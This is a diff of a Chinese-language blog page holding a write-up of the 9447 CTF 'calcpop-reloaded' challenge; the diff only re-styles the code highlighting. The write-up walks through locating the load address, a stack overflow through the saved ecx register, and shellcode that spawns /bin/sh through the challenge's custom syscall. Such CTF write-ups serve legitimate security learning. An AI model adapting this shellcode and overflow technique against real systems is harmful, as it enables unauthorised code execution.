@@ -1,73 +1,39 @@
-<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.83.1"><title>Writeup-9447 CTF: calcpop-reloaded - /home/cubl</title><meta property="og:title" content="Writeup-9447 CTF: calcpop-reloaded - /home/cubl"><link href=/favicon.ico rel=icon type=image/x-icon><link rel=stylesheet href=/css/main.min.9ae39f94818f4da457a6d1bcb86758258559067c36817f968ab59ae3c5c39b4bb6b793e3de3d4cc608ab8e1e4d178f67f70ad266ed0fadfae98939fab0d30b92.css integrity="sha512-muOflIGPTaRXptG8uGdYJYVZBnw2gX+WirWa48XDm0u2t5Pj3j1Mxgirjh5NF49n9wrSZu0PrfrpiTn6sNMLkg==" media=all></head><body><div class=wrapper><header class=header><nav class=nav><a href=/ class=nav-logo><img src=/images/logo-min.png width=50 height=50 alt=Logo></a><ul class=nav-links><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li><li><a href=https://github.com/cubarco/cubarco.github.io>GitHub</a></li></ul></nav></header><main class=content role=main><article class=article><h1 class=article-title>Writeup-9447 CTF: calcpop-reloaded</h1><span class=article-date>2015-12-04</span>
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.83.1"><title>Writeup-9447 CTF: calcpop-reloaded - /home/cubl</title><meta property="og:title" content="Writeup-9447 CTF: calcpop-reloaded - /home/cubl"><link href=/favicon.ico rel=icon type=image/x-icon><link rel=stylesheet href=/css/main.min.9861353c7baacf2268a74fe7ea9d3bd8211eada1554a630c4d29fb448bfae5fb8f43ea02baa52d2ca079d0027f37aa8f058ab0362f4301e9a9b77538d71b549b.css integrity="sha512-mGE1PHuqzyJop0/n6p072CEeraFVSmMMTSn7RIv65fuPQ+oCuqUtLKB50AJ/N6qPBYqwNi9DAempt3U41xtUmw==" media=all></head><body><div class=wrapper><header class=header><nav class=nav><a href=/ class=nav-logo><img src=/images/logo-min.png width=50 height=50 alt=Logo></a><ul class=nav-links><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li><li><a href=https://github.com/cubarco/cubarco.github.io>GitHub</a></li></ul></nav></header><main class=content role=main><article class=article><h1 class=article-title>Writeup-9447 CTF: calcpop-reloaded</h1><span class=article-date>2015-12-04</span>
 <a class=article-tag href=/tags/hack>Hack</a>
 <a class=article-tag href=/tags/ctf>CTF</a>
 <a class=article-tag href=/tags/writeup>Writeup</a>
-<a class=article-tag href=/tags/exploitation>Exploitation</a><div class=article-content><p><em>从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的）</em></p><p>这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣&mldr;），硬着头皮写篇 writeup 记录一下。</p><h2 id=load-address>Load Address</h2><p>找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到<code>mov eax, 0x1007a7</code>这类代码，大概可以猜出 load address 在 0x100000.</p><p>用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc.</p><h2 id=overflow>Overflow</h2><p>接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。</p><p>这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用<code>shutdown()</code>之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。</p><p>接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化：</p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=color:#998;font-style:italic>; entry:</span>
-<span style=color:#900;font-weight:700>lea</span>     <span style=color:#0086b3>ecx</span>, [<span style=color:#0086b3>esp</span><span style=color:#000;font-weight:700>-</span><span style=color:#099>4</span>]
-<span style=color:#900;font-weight:700>and</span>     <span style=color:#0086b3>esp</span>, <span style=color:#099>0FFFFFFF0h</span>
-<span style=color:#900;font-weight:700>push</span>    <span style=color:#458;font-weight:700>dword</span> <span style=color:teal>ptr</span> [<span style=color:#0086b3>ecx</span><span style=color:#000;font-weight:700>-</span><span style=color:#099>4</span>]
-<span style=color:#900;font-weight:700>push</span>    <span style=color:#0086b3>ebp</span>
-<span style=color:#900;font-weight:700>mov</span>     <span style=color:#0086b3>ebp</span>, <span style=color:#0086b3>esp</span>
-<span style=color:#900;font-weight:700>push</span>    <span style=color:#0086b3>edi</span>
-<span style=color:#900;font-weight:700>push</span>    <span style=color:#0086b3>esi</span>
-<span style=color:#900;font-weight:700>push</span>    <span style=color:#0086b3>ebx</span>
-<span style=color:#900;font-weight:700>push</span>    <span style=color:#0086b3>ecx</span>
+<a class=article-tag href=/tags/exploitation>Exploitation</a><div class=article-content><p><em>从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的）</em></p><p>这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣&mldr;），硬着头皮写篇 writeup 记录一下。</p><h2 id=load-address>Load Address</h2><p>找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到<code>mov eax, 0x1007a7</code>这类代码，大概可以猜出 load address 在 0x100000.</p><p>用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc.</p><h2 id=overflow>Overflow</h2><p>接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。</p><p>这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用<code>shutdown()</code>之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。</p><p>接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化：</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=c1>; entry:</span>
+<span class=nf>lea</span>     <span class=nb>ecx</span><span class=p>,</span> <span class=p>[</span><span class=nb>esp</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
+<span class=nf>and</span>     <span class=nb>esp</span><span class=p>,</span> <span class=mh>0FFFFFFF0h</span>
+<span class=nf>push</span>    <span class=kt>dword</span> <span class=nv>ptr</span> <span class=p>[</span><span class=nb>ecx</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
+<span class=nf>push</span>    <span class=nb>ebp</span>
+<span class=nf>mov</span>     <span class=nb>ebp</span><span class=p>,</span> <span class=nb>esp</span>
+<span class=nf>push</span>    <span class=nb>edi</span>
+<span class=nf>push</span>    <span class=nb>esi</span>
+<span class=nf>push</span>    <span class=nb>ebx</span>
+<span class=nf>push</span>    <span class=nb>ecx</span>
 
-<span style=color:#998;font-style:italic>; exit:</span>
-<span style=color:#900;font-weight:700>lea</span>     <span style=color:#0086b3>esp</span>, [<span style=color:#0086b3>ebp</span><span style=color:#000;font-weight:700>-</span><span style=color:#099>10h</span>]
-<span style=color:#900;font-weight:700>xor</span>     <span style=color:#0086b3>eax</span>, <span style=color:#0086b3>eax</span>
-<span style=color:#900;font-weight:700>pop</span>     <span style=color:#0086b3>ecx</span>
-<span style=color:#900;font-weight:700>pop</span>     <span style=color:#0086b3>ebx</span>
-<span style=color:#900;font-weight:700>pop</span>     <span style=color:#0086b3>esi</span>
-<span style=color:#900;font-weight:700>pop</span>     <span style=color:#0086b3>edi</span>
-<span style=color:#900;font-weight:700>pop</span>     <span style=color:#0086b3>ebp</span>
-<span style=color:#900;font-weight:700>lea</span>     <span style=color:#0086b3>esp</span>, [<span style=color:#0086b3>ecx</span><span style=color:#000;font-weight:700>-</span><span style=color:#099>4</span>]
-<span style=color:#900;font-weight:700>retn</span>
-</code></pre></td></tr></table></div></div><p>溢出到保存 ecx 的位置，使 ecx - 4 指向存有 shellcode 地址的栈位置，然后 ret 就能跳转到 shellcode.</p><h2 id=shellcode>Shellcode</h2><p>这题怎么写 shellcode 也是一个难点，因为系统是 9447 写的，不能直接用 execv 系统调用。所幸的是本题的系统调用功能都是能从一些字符串上看出来的。比如<code>read(%d %x %d)</code>, <code>write(%d %x %d)</code>之类。strings 一下可以看到<code>spawn(%x %x %d)</code>，我就猜测这个是类似 execv 的系统调用。可是参数不明确，特别是第三个参数。试了几次，发现用<code>spawn("/bin/sh", "/bin/sh", 1)</code>这样的参数是可以成功的，第三个参数 1 具体是什么含义，我也没搞明白。</p><p>用 pwntool 生成的 shellcode 如下:</p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=color:#998;font-style:italic>; push &#39;/bin/sh\x00&#39;</span>
-<span style=color:#900;font-weight:700>push</span> <span style=color:#099>0x1010101</span>
-<span style=color:#900;font-weight:700>xor</span> <span style=color:#458;font-weight:700>dword</span> <span style=color:teal>ptr</span> [<span style=color:#0086b3>esp</span>], <span style=color:#099>0x169722e</span>
-<span style=color:#900;font-weight:700>push</span> <span style=color:#099>0x6e69622f</span>
-<span style=color:#900;font-weight:700>mov</span> <span style=color:#0086b3>edi</span>, <span style=color:#0086b3>esp</span>
+<span class=c1>; exit:</span>
+<span class=nf>lea</span>     <span class=nb>esp</span><span class=p>,</span> <span class=p>[</span><span class=nb>ebp</span><span class=o>-</span><span class=mh>10h</span><span class=p>]</span>
+<span class=nf>xor</span>     <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
+<span class=nf>pop</span>     <span class=nb>ecx</span>
+<span class=nf>pop</span>     <span class=nb>ebx</span>
+<span class=nf>pop</span>     <span class=nb>esi</span>
+<span class=nf>pop</span>     <span class=nb>edi</span>
+<span class=nf>pop</span>     <span class=nb>ebp</span>
+<span class=nf>lea</span>     <span class=nb>esp</span><span class=p>,</span> <span class=p>[</span><span class=nb>ecx</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
+<span class=nf>retn</span>
+</code></pre></div><p>溢出到保存 ecx 的位置，使 ecx - 4 指向存有 shellcode 地址的栈位置，然后 ret 就能跳转到 shellcode.</p><h2 id=shellcode>Shellcode</h2><p>这题怎么写 shellcode 也是一个难点，因为系统是 9447 写的，不能直接用 execv 系统调用。所幸的是本题的系统调用功能都是能从一些字符串上看出来的。比如<code>read(%d %x %d)</code>, <code>write(%d %x %d)</code>之类。strings 一下可以看到<code>spawn(%x %x %d)</code>，我就猜测这个是类似 execv 的系统调用。可是参数不明确，特别是第三个参数。试了几次，发现用<code>spawn("/bin/sh", "/bin/sh", 1)</code>这样的参数是可以成功的，第三个参数 1 具体是什么含义，我也没搞明白。</p><p>用 pwntool 生成的 shellcode 如下:</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=c1>; push &#39;/bin/sh\x00&#39;</span>
+<span class=nf>push</span> <span class=mh>0x1010101</span>
+<span class=nf>xor</span> <span class=kt>dword</span> <span class=nv>ptr</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=mh>0x169722e</span>
+<span class=nf>push</span> <span class=mh>0x6e69622f</span>
+<span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>esp</span>
 
-<span style=color:#900;font-weight:700>push</span> <span style=color:#099>0x1</span>
-<span style=color:#900;font-weight:700>push</span> <span style=color:#0086b3>edi</span>
-<span style=color:#900;font-weight:700>push</span> <span style=color:#0086b3>edi</span>
-<span style=color:#900;font-weight:700>push</span> <span style=color:#099>0xdeadbeef</span>  <span style=color:#998;font-style:italic>; junk</span>
-<span style=color:#900;font-weight:700>mov</span> <span style=color:#0086b3>ebx</span>, <span style=color:#099>302125832</span>
-<span style=color:#900;font-weight:700>xor</span> <span style=color:#0086b3>ebx</span>, <span style=color:#099>0x12121212</span>
-<span style=color:#900;font-weight:700>call</span> <span style=color:#0086b3>ebx</span>  <span style=color:#998;font-style:italic>; spawn(%x, %x, %d)</span>
-</code></pre></td></tr></table></div></div><h2 id=exppy>exp.py</h2><p>可以用 redos 中的 level1 本地调试。</p><div class=gist data-gist=cubarco/b4aee1ac22f1b3039d30><p>Gist: <a href=https://gist.github.com/cubarco/b4aee1ac22f1b3039d30>cubarco/b4aee1ac22f1b3039d30</a></p></div></div></article><script src=https://utteranc.es/client.js repo=cubarco/cubarco.github.io issue-term=pathname theme=boxy-light crossorigin=anonymous async></script></main><footer class=footer><ul class=footer-links><li><a href=/index.xml type=application/rss+xml target=_blank>RSS feed</a></li><li><a href=https://gohugo.io/ class=footer-links-kudos target=_blank>Made with <img src=/images/hugo-logo.png alt="Img link to Hugo website" width=22 height=22></a></li><li><a>© 2014 - 2015</a></li></ul></footer></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js async></script><script src=/js/main.min.c0265b880e16484a6541ce80355a1ae627d6edcece7e9f5e5a47848c6776dae31c76328b55a8531b625aaf4315dcec7fdf695e3d044d3c19b918e21490e323e5.js integrity="sha512-wCZbiA4WSEplQc6ANVoa5ifW7c7Ofp9eWkeEjGd22uMcdjKLVahTG2Jar0MV3Ox/32lePQRNPBm5GOIUkOMj5Q==" async></script></body></html>
+<span class=nf>push</span> <span class=mh>0x1</span>
+<span class=nf>push</span> <span class=nb>edi</span>
+<span class=nf>push</span> <span class=nb>edi</span>
+<span class=nf>push</span> <span class=mh>0xdeadbeef</span>  <span class=c1>; junk</span>
+<span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mi>302125832</span>
+<span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0x12121212</span>
+<span class=nf>call</span> <span class=nb>ebx</span>  <span class=c1>; spawn(%x, %x, %d)</span>
+</code></pre></div><h2 id=exppy>exp.py</h2><p>可以用 redos 中的 level1 本地调试。</p><div class=gist data-gist=cubarco/b4aee1ac22f1b3039d30><p>Gist: <a href=https://gist.github.com/cubarco/b4aee1ac22f1b3039d30>cubarco/b4aee1ac22f1b3039d30</a></p></div></div></article><script src=https://utteranc.es/client.js repo=cubarco/cubarco.github.io issue-term=pathname theme=boxy-light crossorigin=anonymous async></script></main><footer class=footer><ul class=footer-links><li><a href=/index.xml type=application/rss+xml target=_blank>RSS feed</a></li><li><a href=https://gohugo.io/ class=footer-links-kudos target=_blank>Made with <img src=/images/hugo-logo.png alt="Img link to Hugo website" width=22 height=22></a></li><li><a>© 2014 - 2015</a></li></ul></footer></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js async></script><script src=/js/main.min.80cd05416430ecc6e8a3e4d9463e3a083df57cac0f27d6f9ebf3cb45c729cab418fd5219153ced425c33b68cd59b9b47a4b010b4182d846189072e64e067bf47.js integrity="sha512-gM0FQWQw7Mboo+TZRj46CD31fKwPJ9b56/PLRccpyrQY/VIZFTztQlwztozVm5tHpLAQtBgthGGJBy5k4Ge/Rw==" async></script></body></html>
